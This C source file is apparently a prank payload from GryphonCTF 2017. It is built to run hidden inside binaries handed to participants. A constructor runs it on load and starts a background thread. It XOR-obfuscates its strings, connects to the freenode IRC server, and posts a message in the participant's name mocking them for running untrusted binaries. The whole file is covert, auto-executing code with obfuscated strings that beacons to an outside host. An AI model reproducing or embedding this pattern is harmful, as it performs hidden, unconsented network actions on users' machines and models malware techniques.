/**
 * Created for trolling everyone during the GryphonCTF 2017
 * By Amos (LFlare) Ng <amosng1@gmail.com>
 */
#include <netdb.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>

void _sys_hash(int key, char *string) {
    for (int i = 0; i < strlen(string); i++) {
        string[i] ^= key;
    }
}

void _sys_send(int sock, char *message) {
    // printf("%s", message);
    send(sock, message, strlen(message), 0);
}

void *_sys_construct() {
    struct sockaddr_in server;
    struct hostent *he;
    int sock;
    char sndbuf[2048];
    char rcvbuf[2048];
    char username[6];
    // char match_one[] = "Couldn't";
    char match_one[] = {0x7C, 0x50, 0x4A, 0x53, 0x5B, 0x51, 0x18, 0x4B, 0x00};
    // char match_two[] = "Found";
    char match_two[] = {0x3D, 0x14, 0x0E, 0x15, 0x1F, 0x00};
    // char address[] = "chat.freenode.com";
    char address[] = {0x49, 0x42, 0x4B, 0x5E, 0x04, 0x4C,
                      0x58, 0x4F, 0x4F, 0x44, 0x45, 0x4E,
                      0x4F, 0x04, 0x49, 0x45, 0x47, 0x00};
    // char settings[] = "USER GCTF_ID10T_%s GCTF_ID10T_%s GCTF_ID10T_%s :GCTF_ID10T_%s\nNICK GCTF_ID10T_%s\n";
    char settings[] = {0x57, 0x51, 0x47, 0x50, 0x22, 0x45, 0x41, 0x56,
                       0x44, 0x5D, 0x4B, 0x46, 0x33, 0x32, 0x56, 0x5D,
                       0x27, 0x71, 0x22, 0x45, 0x41, 0x56, 0x44, 0x5D,
                       0x4B, 0x46, 0x33, 0x32, 0x56, 0x5D, 0x27, 0x71,
                       0x22, 0x45, 0x41, 0x56, 0x44, 0x5D, 0x4B, 0x46,
                       0x33, 0x32, 0x56, 0x5D, 0x27, 0x71, 0x22, 0x38,
                       0x45, 0x41, 0x56, 0x44, 0x5D, 0x4B, 0x46, 0x33,
                       0x32, 0x56, 0x5D, 0x27, 0x71, 0x08, 0x4C, 0x4B,
                       0x41, 0x49, 0x22, 0x45, 0x41, 0x56, 0x44, 0x5D,
                       0x4B, 0x46, 0x33, 0x32, 0x56, 0x5D, 0x27, 0x71,
                       0x08, 0x00};
    // char shame[] = "JOIN #gryphonctf\nPRIVMSG #gryphonctf :I AM AN ID10T WHO RUNS BINARIES GIVEN TO ME INDISCRIMINATELY! MOCK MEEE!!!\n";
    char shame[] = {0x35, 0x30, 0x36, 0x31, 0x5F, 0x5C, 0x18, 0x0D, 0x06,
                    0x0F, 0x17, 0x10, 0x11, 0x1C, 0x0B, 0x19, 0x75, 0x2F,
                    0x2D, 0x36, 0x29, 0x32, 0x2C, 0x38, 0x5F, 0x5C, 0x18,
                    0x0D, 0x06, 0x0F, 0x17, 0x10, 0x11, 0x1C, 0x0B, 0x19,
                    0x5F, 0x45, 0x36, 0x5F, 0x3E, 0x32, 0x5F, 0x3E, 0x31,
                    0x5F, 0x36, 0x3B, 0x4E, 0x4F, 0x2B, 0x5F, 0x28, 0x37,
                    0x30, 0x5F, 0x2D, 0x2A, 0x31, 0x2C, 0x5F, 0x3D, 0x36,
                    0x31, 0x3E, 0x2D, 0x36, 0x3A, 0x2C, 0x5F, 0x38, 0x36,
                    0x29, 0x3A, 0x31, 0x5F, 0x2B, 0x30, 0x5F, 0x32, 0x3A,
                    0x5F, 0x36, 0x31, 0x3B, 0x36, 0x2C, 0x3C, 0x2D, 0x36,
                    0x32, 0x36, 0x31, 0x3E, 0x2B, 0x3A, 0x33, 0x26, 0x5E,
                    0x5F, 0x32, 0x30, 0x3C, 0x34, 0x5F, 0x32, 0x3A, 0x3A,
                    0x3A, 0x5E, 0x5E, 0x5E, 0x75};
    // char match_three[] = "End of /NAMES list.";
    char match_three[] = {0x5D, 0x76, 0x7C, 0x38, 0x77, 0x7E, 0x38, 0x37,
                          0x56, 0x59, 0x55, 0x5D, 0x4B, 0x38, 0x74, 0x71,
                          0x6B, 0x6C, 0x36, 0x00};

    // Decrypt all messages
    _sys_hash(0x3F, match_one);
    _sys_hash(0x7B, match_two);
    _sys_hash(0x2A, address);
    _sys_hash(0x02, settings);
    _sys_hash(0x7F, shame);
    _sys_hash(0x18, match_three);

    // Prepare socket
    sock = socket(AF_INET , SOCK_STREAM , 0);

    // Set socket settings
    memcpy(&server.sin_addr, gethostbyname(address)->h_addr_list[0], gethostbyname(address)->h_length);
    server.sin_family = AF_INET;
    server.sin_port = htons(6667);

    // Connect socket
    connect(sock, (struct sockaddr *)&server, sizeof(server));

    // Receive IRC greetings
    while (strstr(rcvbuf, match_one) == NULL && strstr(rcvbuf, match_two) == NULL) {
        recv(sock, rcvbuf, sizeof(rcvbuf), 0);
        // printf("%s", rcvbuf);
    }

    // Generate random username
    srand(time(NULL));
    for (int i = 0; i < 6; i++) {
        username[i] = (unsigned char)(rand() % 26 + 65);
    }

    // Send IRC settings
    sprintf(sndbuf, settings, username, username, username, username, username);
    _sys_send(sock, sndbuf);

    // Join IRC channel, send shame and leave.
    _sys_send(sock, shame);

    // Receive IRC greetings
    while (strstr(rcvbuf, match_three) == NULL) {
        recv(sock, rcvbuf, sizeof(rcvbuf), 0);
        // printf("%s", rcvbuf);
    }

    // Return
    return 0;
}

void __attribute__ ((constructor)) _main() {
    pthread_t thread;
    pthread_create(&thread, NULL, _sys_construct, NULL);
}
